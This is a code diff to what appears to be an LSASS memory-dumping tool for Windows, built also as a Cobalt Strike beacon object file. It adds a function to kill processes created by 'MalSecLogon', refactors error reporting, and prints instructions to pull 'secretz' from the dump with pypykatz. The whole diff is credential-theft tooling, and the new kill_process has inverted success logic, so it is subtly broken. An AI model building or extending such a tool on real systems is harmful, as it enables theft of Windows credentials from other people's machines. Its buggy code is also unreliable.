@@ -2,6 +2,37 @@
 #include "../include/handle.h"
 #include "../include/syscalls.h"
 
+/*
+ * kill a process by PID
+ * used to kill processes created by MalSecLogon
+ */
+BOOL kill_process(
+    DWORD pid
+)
+{
+    if (!pid)
+        return FALSE;
+    // open a handle with PROCESS_TERMINATE
+    HANDLE hProcess = get_process_handle(
+        pid,
+        PROCESS_TERMINATE,
+        FALSE
+    );
+    if (!hProcess)
+        return FALSE;
+
+    NTSTATUS status = NtTerminateProcess(
+        hProcess,
+        ERROR_SUCCESS
+    );
+    if (NT_SUCCESS(status))
+    {
+        syscall_failed("NtTerminateProcess", status);
+        return FALSE;
+    }
+    return TRUE;
+}
+
 BOOL wait_for_process(
     HANDLE hProcess
 )
@@ -13,16 +44,7 @@ BOOL wait_for_process(
     );
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtWaitForSingleObject, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtWaitForSingleObject", status);
         return FALSE;
     }
     return TRUE;
@@ -38,17 +60,7 @@ BOOL delete_file(
     PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
     if (!pUnicodeFilePath)
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-            (ULONG32)sizeof(UNICODE_STRING),
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return FALSE;
     }
 
@@ -73,16 +85,7 @@ BOOL delete_file(
     NTSTATUS status = NtDeleteFile(&objAttr);
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtDeleteFile, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtDeleteFile", status);
         return FALSE;
     }
     return TRUE;
@@ -102,17 +105,7 @@ BOOL file_exists(
     PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
     if (!pUnicodeFilePath)
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-            (ULONG32)sizeof(UNICODE_STRING),
-            GetLastError()
-        );
-#endif
+        malloc_failed();
         return FALSE;
     }
 
@@ -152,16 +145,7 @@ BOOL file_exists(
         return FALSE;
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtCreateFile, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtCreateFile", status);
         return FALSE;
     }
     NtClose(hFile); hFile = NULL;
@@ -178,17 +162,7 @@ PVOID get_process_image(HANDLE hProcess)
         buffer = intAlloc(BufferLength);
         if (!buffer)
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
-                BufferLength,
-                GetLastError()
-            );
-#endif
+            malloc_failed();
             return NULL;
         }
         status = NtQueryInformationProcess(
@@ -204,16 +178,7 @@ PVOID get_process_image(HANDLE hProcess)
         intFree(buffer); buffer = NULL;
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-#ifdef DEBUG
-#ifdef BOF
-    BeaconPrintf(CALLBACK_ERROR,
-#else
-    printf(
-#endif
-        "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
-        status
-    );
-#endif
+    syscall_failed("NtQueryInformationProcess", status);
     return NULL;
 }
 
@@ -254,16 +219,7 @@ DWORD get_pid(
     );
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtQueryInformationProcess", status);
         return 0;
     }
 
@@ -281,7 +237,11 @@ DWORD get_lsass_pid(void)
     return pid;
 }
 
-void print_success(LPCSTR dump_name, BOOL use_valid_sig, BOOL do_write, BOOL is_BOF)
+void print_success(
+    LPCSTR dump_name,
+    BOOL use_valid_sig,
+    BOOL do_write
+)
 {
     if (!use_valid_sig)
     {
@@ -296,29 +256,18 @@ void print_success(LPCSTR dump_name, BOOL use_valid_sig, BOOL do_write, BOOL is_
     }
     if (do_write)
     {
-        if (is_BOF)
-        {
 #ifdef BOF
-            BeaconPrintf(CALLBACK_OUTPUT,
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
+            dump_name,
+            &strrchr(dump_name, '\\')[1]
+        );
 #else
-            printf(
+        printf(
+            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
+            &strrchr(dump_name, '\\')[1]
+        );
 #endif
-                "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-                dump_name,
-                &strrchr(dump_name, '\\')[1]
-            );
-        }
-        else
-        {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_OUTPUT,
-#else
-            printf(
-#endif
-                "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-                &strrchr(dump_name, '\\')[1]
-            );
-        }
     }
     else
     {
@@ -414,16 +363,7 @@ void erase_dump_from_memory(
     );
     if (!NT_SUCCESS(status))
     {
-#ifdef DEBUG
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
-            status
-        );
-#endif
+        syscall_failed("NtFreeVirtualMemory", status);
     }
 }
 
